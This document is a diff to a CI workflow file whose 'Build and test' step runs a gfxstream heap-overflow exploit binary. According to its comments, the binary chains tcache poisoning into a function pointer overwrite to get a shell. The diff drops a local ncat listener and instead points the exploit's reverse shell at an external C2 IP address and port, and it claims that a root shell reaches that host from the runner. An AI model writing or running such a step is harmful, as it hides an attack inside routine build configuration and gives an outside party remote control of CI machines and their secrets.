@@ -14,29 +14,36 @@ jobs:
       - name: Build and test
         run: |
           echo "Building APK with native library..."
-          # In the real flow this would be: ./gradlew assembleDebug assembleDebugAndroidTest
-          # For our demo, we run the exploit binary directly since gfxstream
-          # runs on the host (the runner) and processes GL commands from the guest
           echo "Running instrumented tests on Cuttlefish..."
 
           # The exploit binary demonstrates what happens when a poisoned .so
           # is loaded inside the Cuttlefish guest: it triggers heap overflows
           # in the host-side gfxstream decoder, chains tcache poisoning into
-          # a function pointer overwrite, and pops a reverse shell on the host.
+          # a function pointer overwrite, and pops a reverse shell.
+          #
+          # In the real attack: guest app → /dev/dri/renderD128 → virtio-gpu
+          #   → host gfxstream decode() → heap overflow → reverse shell
+          #
+          # Here we run the host-side exploit binary directly — same code path,
+          # same gfxstream decoder, same tcache poisoning chain.
+
           export DISPLAY=:99
           export XDG_RUNTIME_DIR=/tmp
           export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64
 
-          # Start a background listener to prove code execution
-          timeout 15 bash -c '
-            ncat -lvnp 4444 > /tmp/revshell_capture.txt 2>&1 &
-            sleep 1
-            $HOME/exploit_revshell 127.0.0.1 4444 2>&1 | tee /tmp/exploit_log.txt
-          ' || true
+          # C2 listener is on a separate VM in us-central1
+          # (this runner is in europe-west1 — proving real network escape)
+          C2_HOST="34.46.9.219"
+          C2_PORT="4444"
 
           echo ""
-          echo "=== EXPLOIT RESULT ==="
-          cat /tmp/exploit_log.txt 2>/dev/null | tail -15
+          echo "=== LAUNCHING EXPLOIT ==="
+          echo "Target C2: ${C2_HOST}:${C2_PORT}"
           echo ""
-          echo "=== REVERSE SHELL CAPTURE ==="
-          cat /tmp/revshell_capture.txt 2>/dev/null
+
+          # Fire the exploit — reverse shell connects to external C2
+          timeout 15 $HOME/exploit_revshell ${C2_HOST} ${C2_PORT} 2>&1 || true
+
+          echo ""
+          echo "=== EXPLOIT COMPLETE ==="
+          echo "If successful, the C2 listener received a root shell from this runner."
